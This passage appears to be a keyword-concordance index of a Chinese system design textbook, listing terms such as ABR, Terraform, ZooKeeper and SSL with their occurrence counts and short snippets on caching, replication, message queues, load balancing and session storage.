  c23_b07.md: ...代表一个字符，每个节点代表一个前缀，叶节点包含完整词。要找到所有以 "dist" 开头的查询，遍历 trie 到代表 "dist" 的节点并返回所有补全。  网络规模下，所有查询的单个 trie 太大无法放入内存。解决方案是为每个前缀预计算一组有限...

=== abr (5 occurrences) ===
  c24_b03.md: ...码率（ABR）流**。不是开始时选一个质量然后整会话都用它，播放器持续监控网络条件并在片段边界切换质量。   #### ABR 如何工作  清单文件（HLS `.m3u8` 或 DASH `.mpd`）列出每个可用质量级别及每个质量每个片段的 U...
  c24_b03.md: .../seg002.ts       ...  （示例 URL 中的 `cdn` 代表内容分发网络 CDN。）  播放器的 ABR 算法运行一个反馈循环：  1. **估计可用带宽：** 测量最近片段下载速度。如果第 5 个 1080p 片段（10M...
  c24_b03.md: ...30 秒），播放器可请求更高质量。如果缓冲区小（如 3 秒），播放器应请求更低质量避免卡顿。 5. **重复。**  ABR 算法运行在观众设备（播放器）上，不在服务器。服务器在质量选择中无角色——它只服务请求的片段。这是有意设计：把智能分布到...
  c24_b06.md: ...（标题、可用质量级别、DRM 如适用）→ 播放器获得 manifest URL → 播放器从 CDN 边缘请求清单 → ABR 流开始  控制路径的 API 服务器是无状态的（第 11 章无状态要求），在负载均衡器（第 9 章）后水平扩展。视频元...
  c24_b08.md: ...）映射到具体下载 URL 网格：（质量级别 × 时间区间）→ URL。播放器在播放开始时下载一次清单，然后用它请求片段。ABR 算法根据观测带宽和缓冲区健康为每个列（时间段）选择哪一行（质量级别）。没有清单，播放器就不知道存在哪些质量级别或其片段...

=== preference (5 occurrences) ===
  c26_b03.md: ...个节点？一致性哈希环中的自然答案：协调节点（从键位置顺时针第一个节点）及其后顺时针方向 N-1 个节点。给定键的 **preference list（偏好列表）** 是确定性的——集群中任何节点无需协调即可为任意键计算它。  N=3 副本时：客户端写入 `P...
  c26_b03.md: ...### 26.3 处理故障——Hinted Handoff 与 Sloppy Quorum  当写到达且协调节点的 preference list 包含暂时不可用的节点时怎么办？  严格 quorum 行为：若无法达到 W 个节点，写失败。这保证一致性但牺...
  c26_b04.md: ...Sloppy Quorum  **Sloppy quorum** 允许写继续到环上任意 W 个可用节点，而不一定是标准 preference list 中的 W 个节点。若标准节点 A 不可用，附近的另一节点 B 代替接受该写，并在元数据中记录它作为节点 A...
  c26_b10.md: ...C 被隔离。一个写到达：`PUT("user:101:timeline", new_value)`。写协调器是节点 A，preference list 是 [A, B, C]。追踪 sloppy quorum 加 hinted handoff 下该写的去向。然...
  c26_b10.md: ...A 的视角看哪些节点可达。然后想 R=1 的读可能联系哪个节点。  **答案：** 写追踪：节点 A（协调器）尝试写入 preference list [A, B, C]。节点 C 被隔离——不可达。在 sloppy quorum 下，A 用可用节点继续。W=...

=== terraform (5 occurrences) ===
  c28_b08.md: ...过机器可读配置文件定义和管理基础设施的实践，对待这些配置像对待应用代码一样：版本控制、代码审查、测试、自动应用。  **Terraform**（来自 HashiCorp）是最广泛使用的 IaC 工具。Terraform 文件描述基础设施的期望状态：...
  c28_b08.md: ...控制、代码审查、测试、自动应用。  **Terraform**（来自 HashiCorp）是最广泛使用的 IaC 工具。Terraform 文件描述基础设施的期望状态：       resource "aws_db_instance" "socialsnap...
  c28_b08.md: ...个 Redis 集群、8 个 Kafka 集群、负载均衡器、VPC、DNS 配置——用约 1.5 万行（15,000）Terraform 配置文件描述。任何工程师运行 `terraform apply` 并等待 20 分钟（20 minutes）即可创建隔...
  c28_b08.md: ...载均衡器、VPC、DNS 配置——用约 1.5 万行（15,000）Terraform 配置文件描述。任何工程师运行 `terraform apply` 并等待 20 分钟（20 minutes）即可创建隔离的 SocialSnap 测试环境。  * * *...
  intro.md: ...ers（熔断器）、CDN-backed video delivery（由 CDN 支持的视频分发），以及 200 台由 Terraform 管理的服务器。你会看到它在负载下以真实系统崩溃的方式崩溃，看到修复方案被引入，然后看到下一个扩展天花板出现。到第 27...

=== mysql (4 occurrences) ===
  c01_b04.md: ...但你应该从开始就理解每个选择对扩展的影响。有些决策以后改起来便宜，有些则不然。  第一版选 PostgreSQL 而非 MySQL？需要时容易改。把用户 ID 存成 32 位整数？一旦你有 5 十亿用户且 ID 耗尽，就极难改动。把业务逻辑深埋在数据...
  c04_b04.md: ...一致性；强一致读可用，但延迟更高 | | Zookeeper | C | C | 用于协调；为正确性牺牲可用性 | | MySQL 异步复制 | A | L | 立即接受写入；副本落后 |  PACELC 迫使你在系统设计时回答两个问题，而不是一个。...
  c06_b15.md: ...或自定义图存储，而不是通用图数据库。Neo4j 在中等规模工作，但难以跨机器分布。据报道 Instagram 曾用分片 MySQL 方案处理社交图——这说明理论上正确的工具（图数据库）有时在实践中被工程化足够好的关系型方案超越。  **照片存储：**...
  c12_b02.md: ...录写完后几秒钟把它抄下来。读者可以查任何一份副本。写者必须总是找原始本。  复制机制本身值得理解。PostgreSQL、MySQL 和大多数关系型数据库用**预写日志（write-ahead logging，WAL）**做复制。每次改变数据的写都先记...

=== design (4 occurrences) ===
  c01_b06.md: ...### 1.4 这本书将教你什么  书名是“System Design Thinking（系统设计思维）”，而“思维”这个词是刻意的。这不是一本答案之书。系统设计没有正确答案——只有后果被充...
  c23_b04.md: ...|--- 1 | "distributed systems（分布式系统） are hard" 2 | "systems design requires tradeoffs" 3 | "distributed computing and consiste...
  c23_b04.md: ...offs" 3 | "distributed computing and consistency（一致性）" 4 | "design patterns for reliability"  用户搜索 "distributed systems（分布式系统）...
  c23_b04.md: ...List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2] design | [2, 4] hard | [1] consistency | [3] tradeoffs | [2] relia...

=== engineering (4 occurrences) ===
  c02_b06.md: ...键安全补丁必须上线，你花掉预算。  这种 framing（框架）由 Google 的 Site Reliability Engineering（SRE）团队发明——把可靠性从绝对目标变成可协商的资源。我们将在第 17 章讨论监控时回到 SLO。   ### 2....
  c06_b11.md: ...#systemdesign"     ZINCRBY trending_hashtags:2024-01-15 1 "#engineering"   取当天 Top 10 热门 hashtag：       ZREVRANGE trending_hashtags...
  c06_b11.md: ...024-01-15 0 9 WITHSCORES     → ["#systemdesign", "45231", "#engineering", "38204", ...]   对跨两天的 24 小时滚动窗口，查询两个日桶再在应用代码中合并。  **Trade...
  c28_b13.md: ...h 19) | N/A（测量，非设计模式） | N/A | 强制明确可用性目标 | 中——监控基础设施 **Chaos engineering** (Ch 19) | N/A（测试实践） | N/A | 提升对可用性的信心 | 高——需要纪律和回滚专长    （...

=== trillion (4 occurrences) ===
  c03_b02.md: ...| | 2^30 | 1,073,741,824 | ~1 billion | 1 GB | | 2^40 | ~1 trillion | ~1 trillion | 1 TB | | 2^50 | ~1 quadrillion | ~1 quadril...
  c03_b02.md: ...073,741,824 | ~1 billion | 1 GB | | 2^40 | ~1 trillion | ~1 trillion | 1 TB | | 2^50 | ~1 quadrillion | ~1 quadrillion | 1 PB |...
  c03_b02.md: ...illion | M | | 10^9 | 1 billion | B（字节时也可用 G） | | 10^12 | 1 trillion | T |  信封背面估算的艺术，就是把这些粗略地组合成答案。答案不需要精确。它只需要在一个数量级内准确——也就是 1...
  c23_b10.md: ...（trillion）posting。每个 posting 8 + 4 + 4 = 16 字节。原始索引总大小 = 20 trillion × 16 字节 = 320 TB（terabyte）。实践中，压缩（排序文档 ID 的 delta 编码可高度压缩）降...

=== kbps (4 occurrences) ===
  c03_b08.md: ...** 一个音乐流媒体服务有 50 百万（5000 万）日活用户。每个用户平均每天流式播放 45 分钟音频，码率 128 kbps。此外，1% 的 DAU 每天上传一首新的 4 分钟曲目，编码为 320 kbps。  估算：  * **(a)** 音...
  c03_b08.md: ...式播放 45 分钟音频，码率 128 kbps。此外，1% 的 DAU 每天上传一首新的 4 分钟曲目，编码为 320 kbps。  估算：  * **(a)** 音频流式请求的平均 QPS（假设每个“请求”启动一次 45 分钟流） * **(b)...
  c03_b08.md: ...：**  每天上传数：  50,000,000 × 1% = 500,000 上传/天  一首 4 分钟曲目在 320 kbps 下的文件大小：  时长 = 4 分钟 = 4 × 60 = 240 秒 码率 = 320 kbps = 320,000...
  c03_b08.md: ...分钟曲目在 320 kbps 下的文件大小：  时长 = 4 分钟 = 4 × 60 = 240 秒 码率 = 320 kbps = 320,000 位/秒 文件大小 = 240 × 320,000 = 76,800,000 位 = 76,800,...

=== zookeeper (4 occurrences) ===
  c04_b04.md: ...；单节点确认即接受写入 | | DynamoDB | A | L | 默认最终一致性；强一致读可用，但延迟更高 | | Zookeeper | C | C | 用于协调；为正确性牺牲可用性 | | MySQL 异步复制 | A | L | 立即接受写入；副本...
  c08_b16.md: ...为零——消息消费即删除，任何时刻队列深度最多几千条。迁移到 Kafka 需要规划分区数、调整保留期、监控磁盘使用、管理 ZooKeeper 或 KRaft 集群，并在基础设施上花费更多。当不需要保留和多消费者特性时，这种运维复杂度不合理。  原则：当你需要事...
  c13_b06.md: ...册表中查找服务 B 并转发给合适的实例。服务 A 无需知道注册表。  流行的服务注册表包括 Consul、Etcd 和 Zookeeper。Kubernetes（主导的容器编排平台）内置服务发现——每个服务获得一个 DNS 名，Kubernetes 自动把请...
  c28_b11.md: ...ed log** (Ch 8) | 低（顺序磁盘写） | 分区内有序；跨消费者最终 | 极高——复制、持久化 | 高——Zookeeper/KRaft、分区管理 **Round-robin load balancing** (Ch 9) | 无延迟开销 |...

=== count (4 occurrences) ===
  c05_b06.md: ...nt` 是**反规范化计数器（denormalized counters）**——这个计数本来可以通过 `SELECT COUNT(*) FROM follows WHERE followed_id = user_id` 推导，但规模上去后这个查询会...
  c05_b13.md: ...count` 和 `following_count` 直接存在 `users` 表上，而不是在查询时用 `SELECT COUNT(*)` 计算。这是经典的反规范化 tradeoff（权衡）。描述一种计数器与真实 `follows` 表不同步的场景—...
  c09_b08.md: ...recent posts     GET /users/42/followers → Alice's follower count   三个独立 HTTP 请求，每个都有一次网络往返。   #### GraphQL——以查询作为 API  Graph...
  c09_b16.md: ...ebSocket 连接）：       { "type": "notification_count_update", "count": 7 }   该消息通过 Alice 的 WebSocket 连接推送。Alice 的浏览器毫秒级收到并更新角标。...

=== like (4 occurrences) ===
  c09_b15.md: ...部导航中的通知计数角标实时更新。当 Alice 收到新赞时，浏览器应在 1 秒内显示更新后的计数。设计该功能从数据库中“like”事件到 Alice 浏览器出现通知的端到端架构。你的设计应说明：事件流、推送到浏览器的协议，以及与限流系统的交互。...
  c09_b15.md: ...器出现通知的端到端架构。你的设计应说明：事件流、推送到浏览器的协议，以及与限流系统的交互。  提示  从第 8 章追踪 like 事件。消息队列发布 `post.liked` 事件。某个消费者需要把通知送到 Alice 的浏览器。什么协议支持服务器...
  c09_b16.md: ...**答案：**  **端到端架构：**  **第 1 步：记录 like 事件** Bob 赞了 Alice 的帖子。应用服务器：  * 把 like 插入 PostgreSQL（`likes...
  c09_b16.md: ...端到端架构：**  **第 1 步：记录 like 事件** Bob 赞了 Alice 的帖子。应用服务器：  * 把 like 插入 PostgreSQL（`likes` 表） * 发布 `post.liked` 事件到消息队列（第 8 章） *...

=== primary (4 occurrences) ===
  c05_b10.md: ...SCADE,         created_at  TIMESTAMP DEFAULT NOW(),         PRIMARY KEY (post_id, user_id)     );          -- 快速找到提及某用户的所有帖子...
  c05_b10.md: ...r_id ON mentions(user_id);     -- 快速找到某篇帖子提及的所有用户     -- 已由 PRIMARY KEY (post_id, user_id) 覆盖  **为什么这样设计？** 提及是帖子与用户之间的关系——它应该有...
  c20_b04.md: ...张表。从显然的开始：  **`urls` 表**（核心）：  * `short_code` (VARCHAR(16), PRIMARY KEY) — 短码或自定义别名 * `long_url` (TEXT, NOT NULL) — 目标 URL * `c...
  c20_b04.md: ...果用户已认证  **`clicks` 表**（分析）：  * `id` (BIGINT, AUTO-INCREMENT PRIMARY KEY) * `short_code` (VARCHAR(16), NOT NULL, FK → urls) * `c...

=== date (4 occurrences) ===
  c06_b04.md: ...同一节点上——这使分区内的范围扫描非常快。  对服务器监控用例：       Row key: server_id + date (e.g., "server-001:2024-01-15")     Columns: timestamps → m...
  c06_b12.md: ...e            VARCHAR(200) NOT NULL,         dob             DATE NOT NULL,         insurance_id    VARCHAR(100)     );...
  c06_b12.md: ...frequency       VARCHAR(100),         started_on      DATE NOT NULL,         ended_on        DATE  -- NULL means still...
  c06_b12.md: ...started_on      DATE NOT NULL,         ended_on        DATE  -- NULL means still active     );      CREATE TABLE clinic...

=== friendships (4 occurrences) ===
  c06_b05.md: ...lice 的朋友的朋友都有谁？”的社交网络。  在关系型数据库中，友谊是一张表：       CREATE TABLE friendships (user_id INTEGER, friend_id INTEGER, PRIMARY KEY (user_id,...
  c06_b05.md: ...user_id, friend_id));   “Alice 的朋友”是：`SELECT friend_id FROM friendships WHERE user_id = alice_id`  “Alice 的朋友的朋友”需要自 join：       SE...
  c06_b05.md: ...朋友的朋友”需要自 join：       SELECT DISTINCT f2.friend_id     FROM friendships f1     JOIN friendships f2 ON f1.friend_id = f2.user_id...
  c06_b05.md: ...LECT DISTINCT f2.friend_id     FROM friendships f1     JOIN friendships f2 ON f1.friend_id = f2.user_id     WHERE f1.user_id = alic...

=== lat (4 occurrences) ===
  c06_b10.md: ...前位置：**       Key: "driver:{driver_id}:location"     Value: {lat: 37.7749, lon: -122.4194, updated_at: 1705312000}     TTL:...
  c25_b03.md: ...发送一个 HTTP 请求：      POST /driver/{driver_id}/location     { "lat": 37.7749, "lng": -122.4194, "timestamp": 1714000000 }  位置更...
  c25_b03.md: ...edis 集群轻松处理 500 万操作/秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geohash 索引  为让匹配服务找附近司机，...
  c25_b10.md: ...,000 司机 ÷ 4 秒 = 125,000 写入/秒。每司机存储：`driver:{id}:location` 存 lat（8 字节）、lng（8 字节）、geohash（8 字节）、timestamp（8 字节）≈ 32 字节/键。加上 g...

=== score (4 occurrences) ===
  c06_b11.md: ...**Redis 方案（sorted set，有序集合）：**  帖子创建时，原子递增其 hashtag 在有序集合中的 score：       ZINCRBY trending_hashtags:2024-01-15 1 "#systemdesig...
  c20_b11.md: ...ks` Kafka 消费者（消费者 2）按 `short_code` 为键把事件写入 Redis sorted set，score 为时间戳，member 为点击事件。要获取最近 5 分钟点击：`ZRANGEBYSCORE url:abc1234:c...
  c22_b04.md: ...非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCORE user:F:timeline +inf -inf...
  c22_b05.md: ...多新闻）、显式偏好（用户静音某些账号、关注新话题）。   #### 排序分数计算  简单排序分数组合各信号：      score = affinity_weight × affinity(user, author)           + qual...

=== caching (4 occurrences) ===
  c07_b05.md: ...#### Write-Through 缓存  在 **write-through caching** 中，每次写入同时进入数据库和缓存。缓存始终与数据库保持同步。  **写入路径：**       1. Write...
  c07_b05.md: ...——是好候选。   #### Write-Behind（Write-Back）缓存  在 **write-behind caching** 中，写入立即进入缓存，并在延迟后异步刷到数据库。  **写入路径：**       1. Write value...
  c28_b10.md: ...ility Impact | Operational Complexity ---|---|---|---|--- **Caching** (Ch 7) | 大幅降低读延迟（缓存命中） | 最终一致——缓存数据可能陈旧 | 更高（DB 慢时读仍成功） |...
  c28_b14.md: ...| 极低（客户端算法） | N/A | 极高（优雅降级） | 中（manifest 和分片管理） **CDN edge caching** (Ch 7, 24) | 命中极低；未命中中 | 最终（TTL 或显式失效） | 极高 | 中 **Geohash...

=== fetch (4 occurrences) ===
  c07_b05.md: ...up to date)     2. On miss (first access or cache restart): fetch from database   **收益：** 缓存从不过期。读取几乎总是命中缓存。  **代价：** 每次写入需要两...
  c09_b08.md: ...L 标识的资源表达 CRUD 操作。       GET  /users/42                   → fetch user 42     POST /users                      → create a new...
  c22_b13.md: ...1ms），完全可行。相比之下，以 10 万 RPS 轮询完整 feed 组装，需要 100,000 × 20 次数据库 fetch/秒 = 200 万（2 million）数据库读/秒。  轻量检查查询把每次请求成本降低到完整 feed 组装的 1/...
  c23_b02.md: ...is not empty:         url = queue.dequeue()         page = fetch(url)         links = extract_links(page)         for link i...

=== store (4 occurrences) ===
  c07_b07.md: ...("SELECT * FROM users WHERE id = %s", [user_id])          # Store in cache with 5-minute TTL         redis.setex(cache_key, 3...
  c28_b11.md: ...xes** (Ch 5) | 降低读延迟；提高写延迟 | N/A | N/A | 低——自动维护 **Document store (MongoDB)** (Ch 6) | 文档级操作低 | 最终（默认）；可配置 | 高（副本集） | 中 **Key...
  c28_b11.md: ...DB)** (Ch 6) | 文档级操作低 | 最终（默认）；可配置 | 高（副本集） | 中 **Key-value store (Redis)** (Ch 6, 7) | 极低（内存） | 最终（异步复制） | 高（集群模式） | 低–中 **C...
  c28_b11.md: ...h 6, 7) | 极低（内存） | 最终（异步复制） | 高（集群模式） | 低–中 **Column-family store (Cassandra)** (Ch 6) | 低（写优化） | 可调（N/W/R quorum） | 极高（无主） |...

=== phil (4 occurrences) ===
  c07_b16.md: ...#### 深入思考  **Q1.** SocialSnap 工程师 Phil 提出一种“完美缓存失效”策略：“我们完全不用 TTL，每次写入都触发缓存失效事件。用户 Alice 更新任何字段，我们...
  c07_b16.md: ...所有粉丝的 Feed 缓存失效。” 分析这个提案。它对在哪里？它带来什么 TTL 能避免的故障模式？  **讨论：** Phil 的提案有一件事非常对：它实现零陈旧。与基于 TTL 的缓存不同，缓存永远不会服务比最后一次相关写入更旧的数据。对一致性...
  c07_b16.md: ...未命中——如果这位名人的 500 万活跃粉丝在未来几分钟查看 Feed，你就会在极短时间内得到 500 万个数据库查询。Phil 的完美失效策略在最大规模上制造了惊群。  TTL 避免的故障模式：基于 TTL 的过期自然分散缓存未命中。不同服务器上...
  c07_b16.md: ...存副本在略不同时间过期（如果加了抖动）。不同用户的缓存副本有不同 TTL。未命中负载随时间分布，而不是集中在一次事件上。Phil 的方法把未命中负载集中在写入事件——而写入事件通常本身是突发的（名人发帖、突发新闻、产品发布）。  生产答案是混合：对...

=== onboarding (4 occurrences) ===
  c08_b01.md: ...据库中创建。必须发送欢迎邮件。必须通知所有通过手机通讯录关联好友的人。必须记录“新用户”事件到分析系统。用户可能被加入 onboarding 序列。如果用户通过推荐链接注册，推荐人必须获得积分。  在 SocialSnap v2 中，这一切同步发生——在同一个...
  c08_b03.md: ...册时，多个系统关心：  * 邮件服务（发送欢迎邮件） * 分析系统（记录注册事件） * 联系人通知系统（通知好友） * onboarding 系统（启动 onboarding 序列）  如果只有一个队列，你要么让所有消费者在同一队列上（每条消息随机投递给一个消...
  c08_b04.md: ...t Notification Service (subscriber)         └── delivers to Onboarding Service (subscriber)   注册服务发布一个事件。四个消费者都收到。添加新消费者（如反欺诈服务）不需...
  c08_b11.md: ...ub-sub 当：** 一个事件有多个独立消费者感兴趣。SocialSnap 的注册事件对邮件服务、分析、联系人通知和 onboarding 都感兴趣。如果你用点对点队列，需要四个单独队列（每个消费者一个），注册服务要向四个队列发布。Pub-sub 把它合并：...

=== rabbitmq (4 occurrences) ===
  c08_b04.md: ...订阅者），对修改关闭（新增消费者无需改动）。   ### 8.5 Kafka——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对...
  c27_b02.md: ...个月）  **它是什么：** Celery（Python 任务队列），后端先由 Redis 支持，可靠性要求提高后换成 RabbitMQ。通知发送、邮件投递、feed 更新计算移到异步 worker。  **关键决策：**  * 欢迎邮件、帖子通知、关注通...
  c27_b04.md: ...LK 集中日志、Kafka 事件骨干、CDN 媒体交付、完整微服务网格。  **关键决策：**  * Kafka 取代 RabbitMQ 成为事件骨干（需要保留、回放和消费者组语义） * Feed 服务采用混合扇出架构（第 22 章）以处理名人账号 * 推...
  c27_b11.md: ...Kafka 骨干 + Kubernetes | 以 Kubernetes 运营开销为代价获得灵活事件处理和自动扩展 | RabbitMQ 某些场景丢消息；手动扩展对流量尖峰太慢...

=== delivers (4 occurrences) ===
  c08_b04.md: ...up" event to topic         ↓     Message Broker         ├── delivers to Email Service (subscriber)         ├── delivers to Analy...
  c08_b04.md: ...├── delivers to Email Service (subscriber)         ├── delivers to Analytics Service (subscriber)         ├── delivers to C...
  c08_b04.md: ...├── delivers to Analytics Service (subscriber)         ├── delivers to Contact Notification Service (subscriber)         └── de...
  c08_b04.md: ...rs to Contact Notification Service (subscriber)         └── delivers to Onboarding Service (subscriber)   注册服务发布一个事件。四个消费者都收到。添加...

=== welcome (4 occurrences) ===
  c08_b07.md: ...← reads "user.signup" event from queue         ← sends welcome email (300ms — doesn't block the user)      Queue Consumer:...
  c08_b11.md: ...= event['user_id']          # Check if we already sent the welcome email         already_sent = db.query(             "SELECT...
  c08_b11.md: ..."SELECT 1 FROM sent_emails WHERE user_id = %s AND type = 'welcome'",             [user_id]         )          if already_sent...
  c08_b11.md: ..."INSERT INTO sent_emails (user_id, type) VALUES (%s, 'welcome')",             [user_id]         )   先检查后行动的模式把非幂等操作变成幂等操作...

=== uuid (4 occurrences) ===
  c08_b12.md: ...`INSERT` 静默什么都不做。这是幂等插入——数据库级唯一约束无需显式先检查后行动代码就强制幂等。  这种用事件 UUID 作幂等性 key 加数据库唯一约束的模式，是生产安全的幂等消息处理方法。  **Q2.**（联系第 7 章陈旧性讨论）...
  c15_b04.md: ...同键。第二次升级复用同一键会让服务器返回第一次升级的结果，而不是处理第二次。  最佳实践：用用户 ID、操作类型和随机 UUID 或含足够熵的时间戳组合生成幂等键，以消除冲突。   ### 15.4 Saga 模式——不用 2PC 的分布式事务...
  c15_b13.md: ...恰好哈希到相同值会被错误去重。虽然加密哈希冲突极为罕见，但该设计永远依赖这一假设对所有输入成立。  正确做法：客户端用 UUID 或类似高熵随机值生成幂等键，并通过请求头显式传递（例如 `Idempotency-Key: 7f3a9b2c-...`...
  c15_b14.md: ...恰好哈希到相同值会被错误去重。虽然加密哈希冲突极为罕见，但该设计永远依赖这一假设对所有输入成立。  正确做法：客户端用 UUID 或类似高熵随机值生成幂等键（idempotency key，幂等性），并通过请求头显式传递（例如 `Idempoten...

=== incoming (4 occurrences) ===
  c08_b13.md: ...notifications 表，频繁变化（每次点赞、评论、关注等）。  如果通知计数被包含在资料缓存 key 中，每个 incoming 通知都会要求使整个资料缓存失效——迫使数据库重新取回没变化的简介、头像 URL 和其他稳定数据。这是缓存失效浪费：你因...
  c09_b01.md: ...### 9.2 负载均衡器——分配工作  假设 SocialSnap 运行 5 台应用服务器。哪个服务器应该处理 incoming 请求？答案不能是“总是 server 1”——server 1 会被压垮，而 servers 2–5 闲置。你需要一个...
  c09_b01.md: ...是**负载均衡器（load balancer）**。   #### 定义：负载均衡器  **负载均衡器** 是一个接收 incoming 请求并将其分发给一组后端服务器的组件，目标是最大化吞吐、最小化延迟，并避免压垮任何单台服务器。  plain 语言：负...
  c10_b18.md: ...eSQL 实例的上限。在同一数据库上混合高频写入与重度分析读取会同时拖垮两种工作负载：分析查询持有锁并消耗 I/O，与 incoming 写入竞争。  **为什么对象存储（S3）不够：**  对象存储优化了按 key 读取或写入整个对象。“统计标签为 #s...

=== ssl (4 occurrences) ===
  c09_b03.md: ...apMobile`）的请求路由到为移动 API 响应优化的服务器集群 * 按地理区域路由（通过 IP 地理位置）  **SSL 终止：** L7 负载均衡器通常在自身终止 TLS。浏览器与负载均衡器建立加密 HTTPS 连接。负载均衡器解密请求、...
  c09_b03.md: ...发到内部网络的后端服务器。这把计算昂贵的 TLS 处理从应用服务器卸载到负载均衡器。  **优点：** 基于内容的路由、SSL 终止、头操作、限流（9.7 节会讲）。  **代价：** L7 比 L4 慢（必须解析完整 HTTP 请求），运维更贵...
  c09_b03.md: ...gRPC 专门支持就不能路由 gRPC 流量。  对大多数 Web 应用，L7 负载均衡是正确选择：基于内容的路由和 SSL 终止收益超过性能开销。...
  c09_b10.md: ...API 网关** 是位于客户端与后端服务之间的中间服务。它集中处理横切关注点：认证、限流（rate limiting）、SSL 终止、请求路由、协议转换和日志。  plain 语言：API 网关是你的服务的前门。所有请求都通过它进入。它检查凭据、...

=== body (4 occurrences) ===
  c09_b03.md: ...载均衡  第 7 层（L7）负载均衡器读取请求的应用层内容——具体来说，是 HTTP 请求，包括 URL、头，有时还有 body。这实现了**基于内容的路由（content-based routing）**。  **基于内容的路由示例：**  *...
  c09_b08.md: ...服务器实现更复杂（需要 schema、每个字段的 resolver） * 缓存更难——因为查询是带自定义 query body 的 POST 请求，HTTP 层缓存不适用；缓存必须在应用层做 * 过于灵活的查询可能成为安全问题（客户端可构造深嵌套...
  c09_b14.md: ...`GET /feed` 可在 CDN 或浏览器层缓存（HTTP 层缓存）。GraphQL 查询是带自定义 query body 的 POST 请求，HTTP 缓存不适用。缓存必须在应用层处理——要么在 GraphQL 客户端（如 Apollo C...
  c20_b05.md: ...URL 创建是写路径。1,157 次创建/秒，单个数据库主库可管理。流程：  1. 收到 `POST /urls`，body `{"long_url": "https://..."}` 2. 验证 URL（语法有效？是否可 fetch？可选，会...

=== quic (4 occurrences) ===
  c09_b06.md: ...eb 应用，HTTP/2 通常比 HTTP/1.1 减少 15-30% 页面加载时间。   #### HTTP/3 与 QUIC  HTTP/3 在传输层用 QUIC（Quick UDP Internet Connections）取代 TCP。QU...
  c09_b06.md: ...TP/1.1 减少 15-30% 页面加载时间。   #### HTTP/3 与 QUIC  HTTP/3 在传输层用 QUIC（Quick UDP Internet Connections）取代 TCP。QUIC 基于 UDP，但添加了 TCP...
  c09_b06.md: ...IC  HTTP/3 在传输层用 QUIC（Quick UDP Internet Connections）取代 TCP。QUIC 基于 UDP，但添加了 TCP 的可靠性保证，并提升性能：更快的连接建立（HTTPS 的 1-RTT 而非 3-RTT...
  c09_b06.md: ...TT 而非 3-RTT）、更好的丢包处理（传输层队头阻塞消除），以及原生连接迁移（如果你从 Wi-Fi 切换到蜂窝网络，QUIC 保持连接）。  HTTP/3 部署越来越广，但还不如 HTTP/2 普及。HTTP 版本选择通常由 Web 服务器和...

=== true (4 occurrences) ===
  c09_b15.md: ...GET /api/users/{user_id}/presence       → 返回 { "online": true/false, "last_seen": "..." }       → 检查 Redis：EXISTS presenc...
  c12_b07.md: ...发生——`payments` 表中创建一条支付记录，`users` 表中把该用户的 `is_premium` 标志设为 TRUE。  单数据库时，这是一个 SQL 事务：       BEGIN;     INSERT INTO payments...
  c12_b07.md: ...) VALUES (42, 9.99, ...);     UPDATE users SET is_premium = TRUE WHERE user_id = 42;     COMMIT;   如果任一操作失败，事务回滚——支付记录消失，用户仍...
  c28_b08.md: ...xlarge"       allocated_storage = 500       multi_az      = true       backup_retention_period = 7     }   应用此配置会在 AWS 上创建指定...

=== bucket (4 occurrences) ===
  c10_b05.md: ...（网络延迟占主导），但对数据库随机读操作不可接受。  **不能直接挂载：** 与文件存储（NFS）不同，你不能把 S3 bucket 挂载成本地磁盘并在其上运行数据库。HTTP API 不是块设备接口。  **最终一致性（历史上）：** S3 等系统在...
  c10_b12.md: ...只有一部分 key 需要重新映射。这避免了使缓存失效的集群扩缩容事件。  与对象存储 key 命名的类比：在对象存储中，bucket 里所有对象共享单一命名空间。一个大 bucket 可能被存储供应商内部划分到多台服务器上。供应商通常用对象 key 的...
  c10_b12.md: ...效的集群扩缩容事件。  与对象存储 key 命名的类比：在对象存储中，bucket 里所有对象共享单一命名空间。一个大 bucket 可能被存储供应商内部划分到多台服务器上。供应商通常用对象 key 的哈希决定每个对象存在哪台存储节点上。一组分布良好的...
  c10_b18.md: ...对象存储优化了按 key 读取或写入整个对象。“统计标签为 #systemdesign 的独立用户数”这类查询需要读取 bucket 中每个对象（或大范围前缀扫描）并在应用代码中过滤——没有查询引擎、没有索引、没有把过滤下推到存储层。即使批量读取，以每...

=== bytea (4 occurrences) ===
  c10_b06.md: ...务器故障和数据中心问题 * 头像照片大小从 50 KB 到 5 MB  **方案评估：**  **方案 1：把照片作为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN...
  c10_b06.md: ...greSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：  * PostgreSQL 的 B-tree 索引优化小值。在表中存 2...
  c10_b06.md: ...务器故障和数据中心问题 * 头像照片大小从 50 KB 到 5 MB  **方案评估：**  **方案 1：把照片作为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN...
  c10_b06.md: ...greSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：  * PostgreSQL 的 B-tree 索引优化小值。在表中存 2...

=== sessions (4 occurrences) ===
  c11_b01.md: ...cialSnap v3（仍是单台服务器）中，会话存储就是应用服务器自己的内存——一个 Python 字典：       sessions = {         "sess_a7b3c9d2e4f1": {"user_id": 42, "username"...
  c11_b01.md: ......     }   当带 cookie `sess_a7b3c9d2e4f1` 的请求到达时，服务器在本地 `sessions` 字典中查找，找到用户 42，就知道请求来自 Alice。  一台服务器时没问题。三台服务器就坏了。...
  c11_b04.md: ...储。所有应用服务器从同一个 Redis 实例读写会话。       # 之前：会话在本地内存中（水平扩展错误）     sessions = {}  # 服务器本地字典      # 之后：会话在 Redis 中（水平扩展正确）     def creat...
  c11_b04.md: ...户 42 的所有会话”变成：按 user_id 过滤 `DEL session:*`（或维护反向索引 `user:42:sessions = [sess_id1, sess_id2, ...]`）。本地内存则需要向所有服务器广播登出命令。  **可用性：*...

=== workaround (4 occurrences) ===
  c11_b03.md: ...了症状（请求到达知道它们的会话），却保留了根本问题（状态在服务器间碎片化）。这是错误架构。只应在实现正确方案前作为临时 workaround。   #### 方案 2：服务器间共享会话（脆弱）  另一种方案：使用分布式共享文件系统或数据库，三台服务器都把会话数...
